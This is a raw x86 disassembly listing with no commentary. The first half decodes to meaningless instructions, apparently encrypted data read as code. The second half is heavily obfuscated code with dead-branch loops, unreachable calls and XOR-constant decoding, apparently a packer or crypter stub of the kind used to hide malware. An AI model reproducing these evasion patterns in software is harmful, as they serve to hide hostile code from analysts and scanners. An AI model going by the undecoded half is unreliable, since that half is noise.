  411990:	hlt    
  411991:	mov    cl,0x79
  411993:	xor    DWORD PTR [edi-0xd],0x69
  411997:	popf   
  411998:	sbb    eax,0xb691406b
  41199d:	cmp    ebp,DWORD PTR [ecx-0x51945312]
  4119a3:	hlt    
  4119a4:	int    0x76
  4119a6:	cli    
  4119a7:	jge    0x411985
  4119a9:	xchg   esi,eax
  4119aa:	stc    
  4119ab:	bound  esi,QWORD PTR [ebx+0x595e0b60]
  4119b1:	(bad)  [edi-0x2c9f2b73]
  4119b7:	cmp    esi,DWORD PTR [ebx-0x57]
  4119ba:	push   0x1b
  4119bc:	pop    ss
  4119bd:	rcr    BYTE PTR [esp+edi*4],cl
  4119c0:	sub    al,0x70
  4119c2:	dec    edx
  4119c3:	and    ecx,DWORD PTR [ecx-0xa]
  4119c6:	sbb    al,0x72
  4119c8:	loopne 0x411960
  4119ca:	push   0xcd656e79
  4119cf:	xchg   BYTE PTR [esi-0x36e6f],ah
  4119d5:	into   
  4119d6:	push   ecx
  4119d7:	xchg   ecx,eax
  4119d8:	push   eax
  4119d9:	xchg   ebx,eax
  4119da:	jg     0x411a0e
  4119dc:	mov    edi,0xba353d61
  4119e1:	shl    BYTE PTR [edx+edx*4-0x64],1
  4119e5:	sub    al,0xf4
  4119e7:	lock mov DWORD PTR [edi+0x69],ecx
  4119eb:	pusha  
  4119ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ed:	adc    BYTE PTR [edi],al
  4119ef:	out    dx,al
  4119f0:	sbb    BYTE PTR [edi+0x68],al
  4119f3:	mov    al,0x6a
  4119f5:	rcr    DWORD PTR [esi+0x56],0x80
  4119f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119fa:	xor    DWORD PTR [esi],0x2107f3db
  411a00:	es push ebp
  411a02:	or     al,0x13
  411a04:	push   es
  411a05:	jge    0x411a7c
  411a07:	arpl   WORD PTR [ebp-0x37ba9789],ax
  411a0d:	syscall 
  411a0f:	xchg   esp,eax
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	jp     0x4119da
  411a13:	(bad)  
  411a14:	pop    edi
  411a15:	mov    cl,0x44
  411a17:	fstp   TBYTE PTR [edi-0x6b]
  411a1a:	pop    ebp
  411a1b:	dec    esp
  411a1c:	in     eax,0xdb
  411a1e:	pusha  
  411a1f:	xor    cl,BYTE PTR [ebp+0x51e43a5]
  411a25:	(bad)  
  411a26:	xchg   esp,eax
  411a27:	clc    
  411a28:	mov    esi,edx
  411a2a:	jecxz  0x4119c9
  411a2c:	inc    eax
  411a2d:	scas   al,BYTE PTR es:[edi]
  411a2e:	sbb    al,0x28
  411a30:	mov    ch,0xf
  411a32:	enter  0xc4a2,0x8f
  411a36:	cli    
  411a37:	sbb    al,0x1d
  411a39:	popf   
  411a3a:	retf   0x75a8
  411a3d:	xchg   BYTE PTR [esi],dh
  411a3f:	jecxz  0x411a63
  411a41:	(bad)
  411a44:	(bad)  
  411a45:	adc    bh,ah
  411a47:	adc    DWORD PTR ds:0xebce11f2,edx
  411a4d:	data16 scas al,BYTE PTR es:[edi]
  411a4f:	inc    eax
  411a50:	rol    DWORD PTR [ebp-0x3ce744d3],0xcf
  411a57:	mov    dl,0x63
  411a59:	mov    edi,0xb525dc00
  411a5e:	leave  
  411a5f:	inc    ecx
  411a60:	pop    ss
  411a61:	add    BYTE PTR [ebp+0x5689c0ea],ch
  411a67:	adc    BYTE PTR [ecx+ecx*4],dl
  411a6a:	adc    eax,0x5cbdf474
  411a6f:	lods   eax,DWORD PTR ds:[esi]
  411a70:	mov    bh,0x36
  411a72:	ins    DWORD PTR es:[edi],dx
  411a73:	shl    BYTE PTR [edx+0x2584b4c8],0x2f
  411a7a:	ret    0x51e4
  411a7d:	pop    ebx
  411a7e:	les    ebx,FWORD PTR [esi]
  411a80:	es ret 
  411a82:	lods   eax,DWORD PTR ds:[esi]
  411a83:	mov    WORD PTR [edx],ds
  411a85:	or     dl,BYTE PTR [eax]
  411a87:	das    
  411a88:	(bad)  
  411a89:	pop    ebp
  411a8a:	cmp    BYTE PTR [esi-0x7a],0x86
  411a8e:	outs   dx,BYTE PTR ds:[esi]
  411a8f:	or     DWORD PTR [eax+ebp*2+0x15],edx
  411a93:	xchg   ecx,eax
  411a94:	imul   edi,edx,0xffffffb0
  411a97:	ret    0x8e90
  411a9a:	and    DWORD PTR [ecx+0x2ee96c37],ebx
  411aa0:	push   ss
  411aa1:	mov    ch,0xf5
  411aa3:	jns    0x411a65
  411aa5:	aad    0xd6
  411aa7:	inc    ebp
  411aa8:	add    dh,BYTE PTR [edi+0x30]
  411aab:	and    DWORD PTR [ecx-0x28d05c9a],0x4c
  411ab2:	mov    esi,0xecf96196
  411ab7:	outs   dx,BYTE PTR fs:[esi]
  411ab9:	adc    al,0xc1
  411abb:	fidiv  DWORD PTR [edx-0x3b939902]
  411ac1:	pop    edx
  411ac2:	xor    al,BYTE PTR [esi]
  411ac4:	xchg   esp,eax
  411ac5:	stos   DWORD PTR es:[edi],eax
  411ac6:	aas    
  411ac7:	and    cl,BYTE PTR [edi]
  411ac9:	push   edi
  411aca:	sub    DWORD PTR [ebp-0x1b685713],esp
  411ad0:	test   DWORD PTR [edx-0x71830ae4],eax
  411ad6:	aaa    
  411ad7:	rcr    DWORD PTR [esp+esi*1+0x5d],cl
  411adb:	data16 jbe 0x411aed
  411ade:	mov    esp,esp
  411ae0:	sbb    BYTE PTR [esi-0x5f5e1285],dl
  411ae6:	(bad)  
  411ae7:	mov    al,0x98
  411ae9:	sbb    ebp,DWORD PTR [ecx-0x61]
  411aec:	popf   
  411aed:	sbb    al,0xee
  411aef:	shl    DWORD PTR [eax+edx*8+0x60],1
  411af3:	mov    ah,0x12
  411af5:	push   edx
  411af6:	xor    BYTE PTR [edx],dh
  411af8:	dec    ecx
  411af9:	xchg   ecx,eax
  411afa:	mov    eax,ds:0x1317005d
  411aff:	call   0x9b0d:0x22b8a69d
  411b06:	mov    ch,0x8e
  411b08:	add    cl,dl
  411b0a:	xchg   ebp,eax
  411b0b:	repnz lods al,BYTE PTR ss:[esi]
  411b0e:	pusha  
  411b0f:	int3   
  411b10:	xchg   ebp,eax
  411b11:	add    BYTE PTR [ebx+esi*2],ah
  411b14:	inc    ebp
  411b15:	pop    es
  411b16:	add    al,0xa6
  411b18:	in     al,0x7f
  411b1a:	mov    al,BYTE PTR [ecx]
  411b1c:	mov    ecx,0x60bed5fd
  411b21:	js     0x411b88
  411b23:	or     ah,0xb4
  411b26:	call   0x9ab7:0xc4c73a7a
  411b2d:	sar    ebx,0x59
  411b30:	or     eax,esp
  411b32:	cmp    DWORD PTR [esi],esi
  411b34:	fisttp WORD PTR [eax]
  411b36:	mov    bl,0xb2
  411b38:	and    DWORD PTR [edx],edx
  411b3a:	mov    eax,ds:0x8e5888bf
  411b3f:	je     0x411ad6
  411b41:	pop    eax
  411b42:	mov    bl,0xd8
  411b44:	fcomp  QWORD PTR [eax]
  411b46:	sbb    eax,0xb1f8ecdc
  411b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b4c:	out    dx,eax
  411b4d:	stos   DWORD PTR es:[edi],eax
  411b4e:	int    0xfc
  411b50:	loope  0x411b19
  411b52:	test   eax,0x897c0308
  411b57:	dec    ebp
  411b58:	outs   dx,DWORD PTR ds:[esi]
  411b59:	xchg   esi,eax
  411b5a:	xor    BYTE PTR [ebp-0x548a2e92],0xaf
  411b61:	cmp    al,0x92
  411b63:	cmp    eax,esi
  411b65:	jmp    0x5ac9d3b7
  411b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b6b:	in     eax,dx
  411b6c:	inc    ebp
  411b6d:	push   eax
  411b6e:	outs   dx,BYTE PTR ds:[esi]
  411b6f:	mov    ah,0x56
  411b71:	mov    ah,0x3d
  411b73:	xchg   ecx,eax
  411b74:	fistp  QWORD PTR [eax]
  411b76:	mov    eax,ds:0xc85f94a7
  411b7b:	sub    DWORD PTR [esi+ebx*2-0x5696e1d7],ebp
  411b82:	push   edx
  411b83:	fs push 0x56
  411b86:	push   edi
  411b87:	pop    edx
  411b88:	call   0xeb1d:0xcccb36de
  411b8f:	stos   DWORD PTR es:[edi],eax
  411b90:	jp     0x411b63
  411b92:	ja     0x411b2c
  411b94:	adc    eax,0x14fdb259
  411b99:	mov    edx,0x5994abec
  411b9e:	in     al,dx
  411b9f:	xor    ebx,ecx
  411ba1:	xchg   DWORD PTR [eax-0x5],esi
  411ba4:	stc    
  411ba5:	jae    0x411c23
  411ba7:	test   DWORD PTR [edx+0x2a],0xc8162684
  411bae:	inc    edi
  411baf:	jmp    0x89e90ab6
  411bb4:	push   ds
  411bb5:	in     eax,dx
  411bb6:	fwait
  411bb7:	hlt    
  411bb8:	mov    fs,WORD PTR [edx-0x72]
  411bbb:	push   ecx
  411bbc:	aam    0x5e
  411bbe:	adc    DWORD PTR [ebx+0x57d65d45],edi
  411bc4:	fnstenv [edi]
  411bc6:	push   0x7658c9dd
  411bcb:	xor    bl,dl
  411bcd:	fucomi st,st(7)
  411bcf:	cld    
  411bd0:	ret    0x5105
  411bd3:	dec    eax
  411bd4:	mov    ds:0x635d14f8,al
  411bd9:	xchg   ebx,eax
  411bda:	fimul  WORD PTR [eax-0x246cb140]
  411be0:	test   BYTE PTR [ebx+0x5fbb2e99],al
  411be6:	xor    eax,0xd5b39874
  411beb:	pop    esi
  411bec:	fisub  WORD PTR [esi+0x10758bd2]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x42fa00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x42fa3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x42fa04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x42fa40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x42fa08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x42fa44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x42fa48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x42fa0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x42fa4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x42fa10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x42fa14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x42fa18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x42fa1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x42fa20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x42fa24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
